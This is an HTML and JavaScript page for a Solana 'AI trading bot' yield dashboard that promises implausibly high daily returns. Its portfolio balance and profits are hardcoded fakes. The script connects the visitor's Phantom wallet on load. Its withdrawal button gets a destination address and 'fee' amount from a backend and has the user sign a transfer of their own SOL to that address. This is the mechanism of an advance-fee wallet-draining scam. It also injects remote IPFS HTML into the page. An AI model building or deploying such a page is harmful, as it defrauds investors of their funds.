<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>TrueBotAI Ultra Yield Dashboard</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500&family=Roboto&display=swap');
  * { box-sizing: border-box; }
  body { margin:0; font-family:'Roboto',sans-serif; background:#0a0f1a; color:#cbd5e1; }
  header { background:#111827; padding:1rem 2rem 0.5rem; text-align:center; border-bottom:2px solid #f59e0b; box-shadow:0 0 15px #f59e0b; color:#f59e0b; }
  header h1 { font-family:'Orbitron',sans-serif; font-weight:500; font-size:1.8rem; margin:0; letter-spacing:2px; }
  header .fee-notice { font-size:0.9rem; margin-top:0.3rem; color:#fbbf24; }
  button.connect-wallet { background:#f59e0b; border:none; padding:0.6rem 1.3rem; border-radius:25px; color:#0a0f1a; font-weight:600; cursor:pointer; font-family:'Orbitron',sans-serif; margin:1rem 0; }
  button.connect-wallet:hover { background:#d97706; }
  nav { margin-top:1rem; display:flex; justify-content:center; gap:2rem; flex-wrap:wrap; }
  nav button { background:transparent; border:none; font-family:'Orbitron',sans-serif; font-size:1rem; color:#fbbf24; cursor:pointer; padding:0.5rem 1rem; border-radius:12px; transition:0.3s; letter-spacing:1px; min-width:110px; text-align:center; }
  nav button.active, nav button:hover { background:#f59e0b; color:#0a0f1a; box-shadow:0 0 8px #f59e0b; }
  main { max-width:960px; margin:2rem auto; padding:0 1rem; }
  .section { background:#1e293b; border-radius:12px; padding:2rem; box-shadow:0 0 20px #11182788; margin-bottom:2rem; transition:0.3s; }
  .section:hover { box-shadow:0 0 30px #f59e0bcc; }
  .card-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(320px,1fr)); gap:1.5rem; }
  .card { background:#111827; border-radius:10px; padding:1.2rem; box-shadow:inset 0 0 8px #f59e0baa; display:flex; flex-direction:column; justify-content:space-between; min-height:320px; color:#fcd34d; }
  .card h3 { margin:0 0 0.6rem 0; font-family:'Orbitron',sans-serif; letter-spacing:1px; font-weight:700; color:#fbbf24; }
  .card p { flex-grow:1; font-size:0.9rem; color:#fde68acc; margin-bottom:1rem; }
  .earnings { font-size:0.9rem; margin-bottom:1rem; line-height:1.4; }
  .earnings span { display:block; font-weight:600; }
  .min-invest { font-size:0.95rem; font-weight:700; color:#fbbf24; margin-bottom:1rem; }
  .card button { background:#f59e0b; border:none; padding:0.6rem 1rem; border-radius:20px; font-family:'Orbitron',sans-serif; font-weight:700; color:#0a0f1a; cursor:pointer; transition:0.3s; align-self:flex-start; }
  .card button:hover { background:#d97706; }
  footer { text-align:center; color:#fbbf24; font-size:0.9rem; padding:1.5rem 0; letter-spacing:1px; border-top:1px solid #f59e0b; }
  .modal { display:none; position:fixed; z-index:1000; left:0; top:0; width:100%; height:100%; overflow:auto; background-color:rgba(0,0,0,0.8); justify-content:center; align-items:center; }
  .modal-content { background-color:#1e293b; margin:auto; padding:2rem; border:1px solid #f59e0b; border-radius:12px; width:80%; max-width:500px; text-align:center; position:relative; }
  .close-button { color:#aaa; position:absolute; top:10px; right:20px; font-size:28px; font-weight:bold; cursor:pointer; }
  .close-button:hover, .close-button:focus { color:white; text-decoration:none; }
  .address-box { background:#111827; padding:0.8rem; border-radius:8px; margin-top:1rem; word-break:break-all; }
  .address-box button { background:#f59e0b; border:none; padding:0.4rem 0.8rem; border-radius:10px; font-weight:600; cursor:pointer; margin-left:0.5rem; }
</style>
</head>
<body>
<header>
  <h1>TrueBotAI Ultra Yield</h1>
  <div class="fee-notice">Performance Fee: <strong>20% of net profits</strong> only</div>
  <button class="connect-wallet">Connect Wallet</button>
</header>

<nav>
  <button class="active" data-section="trading">Ultra Trading Bots</button>
  <button data-section="sniping">Extreme Sniping</button>
  <button data-section="staking">Yield Farming</button>
  <button data-section="mining">Quantum Mining</button>
  <button data-section="portfolio">Portfolio Overview</button>
</nav>

<main>
  <section id="trading" class="section">
    <h2>Ultra Trading Bots</h2>
    <div class="card-grid">
      <div class="card" data-cid="QmUltraContent123" data-section-id="trading-content">
        <h3>Leverage Trading Bot</h3>
        <p>Utilizes margin and algorithmic trading for ultra-high returns. Suitable only for experienced investors.</p>
        <div class="earnings">
          <span>Daily: 4.0 SOL (~$120)</span>
          <span>Monthly: 120 SOL (~$3,600)</span>
          <span>Yearly: 1440 SOL (~$43,200)</span>
        </div>
        <div class="min-invest">Minimum Investment: 300 SOL (~$9,000)</div>
        <button class="activate-btn">Activate</button>
      </div>
    </div>
  </section>

  <section id="sniping" class="section" style="display:none;">
    <h2>Extreme Sniping</h2>
    <div class="card-grid">
      <div class="card" data-cid="QmUltraContent123" data-section-id="sniping-content">
        <h3>Extreme Sniper Pro</h3>
        <p>Lightning-fast token & NFT sniping, capturing the best launches with high volatility.</p>
        <div class="earnings">
          <span>Daily: 3.0 SOL (~$90)</span>
          <span>Monthly: 90 SOL (~$2,700)</span>
          <span>Yearly: 1080 SOL (~$32,400)</span>
        </div>
        <div class="min-invest">Minimum Investment: 250 SOL (~$7,500)</div>
        <button class="activate-btn">Activate</button>
      </div>
    </div>
  </section>

  <section id="staking" class="section" style="display:none;">
    <h2>Yield Farming</h2>
    <div class="card-grid">
      <div class="card" data-cid="QmUltraContent123" data-section-id="staking-content">
        <h3>Yield Farming Master</h3>
        <p>Multi-protocol yield farming with compounding strategies for optimal returns.</p>
        <div class="earnings">
          <span>Daily: 1.8 SOL (~$54)</span>
          <span>Monthly: 54 SOL (~$1,620)</span>
          <span>Yearly: 648 SOL (~$19,440)</span>
        </div>
        <div class="min-invest">Minimum Investment: 180 SOL (~$5,400)</div>
        <button class="activate-btn">Activate</button>
      </div>
    </div>
  </section>

  <section id="mining" class="section" style="display:none;">
    <h2>Quantum Mining</h2>
    <p>Coming soon...</p>
  </section>

  <section id="portfolio" class="section" style="display:none;">
    <h2>Portfolio Overview</h2>
    <p>Your investments summary will appear here.</p>
    <div class="stat-item">
      <h3>Current Balance:</h3>
      <span id="currentBalance">200.00 SOL</span>
    </div>
    <div class="stat-item">
      <h3>Total Profits:</h3>
      <span id="totalProfits">50.00 SOL</span>
    </div>
    <button id="withdrawalBtn">Initiate Withdrawal</button>
  </section>
</main>

<footer>
  Performance Fee: <strong>20% of net profits</strong> â€” No upfront or hidden fees.
</footer>

<div id="paymentModal" class="modal">
  <div class="modal-content">
    <span class="close-button">&times;</span>
    <h3 id="modalTitle"></h3>
    <div id="modalBody"></div>
  </div>
</div>

<script src="https://unpkg.com/@solana/web3.js@1.78.5/lib/index.iife.js"></script>
<script>
  const paymentModal = document.getElementById('paymentModal');
  const modalTitle = document.getElementById('modalTitle');
  const modalBody = document.getElementById('modalBody');
  const closeButton = document.querySelector('.close-button');

  closeButton.onclick = () => { paymentModal.style.display = 'none'; };
  window.onclick = (e) => { if(e.target==paymentModal) paymentModal.style.display='none'; };

  const showModal = (title,msg) => { modalTitle.textContent=title; modalBody.innerHTML=msg; paymentModal.style.display='flex'; };

  const buttons=document.querySelectorAll('nav button');
  const sections=document.querySelectorAll('main section');
  const connectButton=document.querySelector('.connect-wallet');
  const withdrawalBtn=document.getElementById('withdrawalBtn');
  let userWallet=null;

  // Wallet connect
  const connectWallet=async()=>{
    try{
      if(window.solana && window.solana.isPhantom){
        const resp=await window.solana.connect();
        userWallet=resp.publicKey;
        connectButton.textContent='Wallet Connected';
      }else showModal('Wallet Not Found','<p>Phantom wallet not found. Please install it.</p>');
    }catch(err){ showModal('Connection Error','<p>Failed to connect to wallet.</p>'); }
  };
  window.addEventListener('load', connectWallet);
  connectButton.addEventListener('click',connectWallet);

  // Nav switching
  buttons.forEach(btn=>btn.addEventListener('click',()=>{
    buttons.forEach(b=>b.classList.remove('active'));
    btn.classList.add('active');
    const target=btn.getAttribute('data-section');
    sections.forEach(section=>{ section.style.display=(section.id===target)?'block':'none'; });
  }));

  // Withdrawal
  withdrawalBtn.addEventListener('click',async()=>{
    if(!userWallet){ showModal('Wallet Not Connected','<p>Connect Phantom wallet first.</p>'); return; }
    const userProfit=parseFloat(document.getElementById('totalProfits').textContent);
    if(isNaN(userProfit)||userProfit<=0){ showModal('No Profits','<p>No profits to withdraw.</p>'); return; }
    showModal('Processing Withdrawal...','<p>Approve the transaction in Phantom wallet.</p>');
    try{
      const response=await fetch('/api/withdraw',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userProfit})});
      if(!response.ok)throw new Error('Backend error');
      const {address,feeAmount}=await response.json();
      const dest=new window.solanaWeb3.PublicKey(address);
      const tx=new window.solanaWeb3.Transaction().add(
        window.solanaWeb3.SystemProgram.transfer({fromPubkey:userWallet,toPubkey:dest,lamports:feeAmount*window.solanaWeb3.LAMPORTS_PER_SOL})
      );
      const {signature}=await window.solana.signAndSendTransaction(tx);
      showModal('Transaction Submitted!',`<p>Transaction Signature:</p><div class="address-box">${signature}</div>`);
    }catch(err){ showModal('Transaction Failed',`<p>${err.message}</p>`); }
  });

  // IPFS content fetch
  document.querySelectorAll('.activate-btn').forEach(btn=>{
    btn.addEventListener('click',async e=>{
      const card=e.target.closest('.card');
      const cid=card.getAttribute('data-cid');
      const sectionId=card.getAttribute('data-section-id');
      if(!cid){ showModal('Error','<p>No CID found for this card.</p>'); return; }
      showModal('Loading...','<p>Fetching content from IPFS...</p>');
      try{
        const resp=await fetch(`https://ipfs.io/ipfs/${cid}`);
        if(!resp.ok)throw new Error('Network response was not ok');
        const text=await resp.text();
        paymentModal.style.display='none';
        const parser=new DOMParser();
        const doc=parser.parseFromString(text,'text/html');
        const content=document.getElementById(sectionId);
        if(content){ content.innerHTML=doc.getElementById(sectionId)?.innerHTML||content.innerHTML; }
      }catch(err){ showModal('Content Error',`<p>${err.message}</p>`); }
    });
  });
</script>
</body>
</html>
